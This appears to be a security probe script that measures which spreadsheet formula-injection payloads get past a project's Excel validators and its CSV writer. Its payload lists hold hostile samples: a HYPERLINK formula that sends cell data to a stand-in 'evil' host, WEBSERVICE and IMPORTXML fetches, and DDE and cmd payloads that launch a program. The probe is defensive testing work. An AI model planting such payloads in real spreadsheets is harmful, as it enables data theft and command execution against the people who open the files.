"""Probe 1: quantify the spreadsheet formula-injection bypass surface.

Read-only w.r.t. the repository. Extracts the real validator classes from the
source files (pydantic only, no langchain) and checks which payloads survive.
"""
from __future__ import annotations

import csv as _csv
import io
import re
import sys
from pathlib import Path

REPO = Path(__file__).resolve().parents[3]
TOOLS = REPO / "src" / "backend" / "tools"


def extract(source: str, start_marker: str, end_marker: str | None = None) -> str:
    start = source.index(start_marker)
    if end_marker is None:
        chunk = source[start:]
    else:
        chunk = source[start : source.index(end_marker, start)]
    # `from __future__` must be the first statement; we prepend our own imports.
    # langchain / sibling modules are not needed by the validator classes.
    chunk = chunk.replace("from __future__ import annotations\n", "", 1)
    kept = [
        line
        for line in chunk.splitlines(keepends=True)
        if "langchain_core" not in line and "from ._files" not in line
    ]
    return "".join(kept)


cell_values = [
    "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")",
    "+SUM(1,1)",
    "-SUM(1,1)",
    "@SUM(1,1)",
    "\t=SUM(1,1)",
    "\n=SUM(1,1)",
    "\r=SUM(1,1)",
    "  =SUM(1,1)",
    " =SUM(1,1)",
    " =SUM(1,1)",
    "|cmd| /C calc",
    "cmd| /C calc",
]
formulas = [
    "=cmd|'/c calc'!A1",
    "=WEBSERVICE(\"http://evil/x\")",
    "=WEBAPI(\"http://evil/x\")",
    "=IMPORTXML(\"http://evil/x\",\"//x\")",
    "=FILTERXML(\"http://evil/x\",\"//x\")",
    "=DDE(\"srv\",\"topic\",\"cmd\")",
    "=HYPERLINK(\"http://evil/?x=\"&A1,\"open\")",
    "\t=SUM(1,1)",
    "=SUM(1,1)",
]


def build_excel_edit():
    src = (TOOLS / "excel_edit.py").read_text(encoding="utf-8")
    chunk = extract(src, "from __future__ import annotations", "class ExcelInspectInput")
    ns = {"__name__": "probe_ee"}
    sys.modules["probe_ee"] = ns
    exec(
        "from pydantic import BaseModel, Field, StrictBool, StrictFloat, StrictInt, StrictStr, model_validator\n"
        "from typing import Annotated, Literal\n"
        + chunk,
        ns,
    )
    return ns["ExcelEditOperation"]


def build_excel_create():
    src = (TOOLS / "excel_create.py").read_text(encoding="utf-8")
    # Whole module: the validator classes call _parse_cell, defined later.
    chunk = extract(src, "from __future__ import annotations")
    ns = {"__name__": "probe_ec"}
    sys.modules["probe_ec"] = ns
    exec(
        "from pydantic import BaseModel, Field, StrictBool, StrictFloat, StrictInt, StrictStr, model_validator\n"
        "from typing import Annotated, Literal\n"
        + chunk,
        ns,
    )
    return ns["SpreadsheetFormula"], ns["SpreadsheetSheet"]


def report(title: str, pairs):
    print(f"=== {title} ===")
    for label, fn in pairs:
        try:
            fn()
            print(f"  ALLOWED  {label}")
        except Exception as exc:  # noqa: BLE001
            print(f"  BLOCKED  {label}   [{str(exc).splitlines()[0]}]")


Op = build_excel_edit()
Formula, Sheet = build_excel_create()

report(
    "excel_edit.set_cell value",
    [(repr(v), lambda v=v: Op(action="set_cell", cell="A1", value=v)) for v in cell_values],
)
report(
    "excel_edit.set_formula formula",
    [(repr(f), lambda f=f: Op(action="set_formula", cell="A1", formula=f)) for f in formulas],
)
report(
    "excel_edit.set_number_format (DDE | not checked here)",
    [
        (repr(f), lambda f=f: Op(action="set_number_format", column_index=1, number_format=f))
        for f in ["#,##0.00", "|cmd| /C calc", "=HYPERLINK(\"http://e/\")"]
    ],
)
report(
    "excel_create.formulas[].formula",
    [(repr(f), lambda f=f: Formula(cell="A1", formula=f)) for f in formulas],
)
report(
    "excel_create.rows[] cell values",
    [(repr(v), lambda v=v: Sheet(name="S", rows=[[v, "x"]])) for v in cell_values],
)

print("=== csv writer round-trip (no guard) ===")
for v in cell_values:
    buf = io.StringIO(newline="")
    _csv.writer(buf).writerow(["hdr", v])
    print(f"  {v!r:46} -> {buf.getvalue().strip()!r}")

print("=== _CONTROL_CHARS skip set ===")
ctl = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f]")
for ch in ["\t", "\n", "\r"]:
    print(f"  {ch!r} in _CONTROL_CHARS? {bool(ctl.search(ch))}")
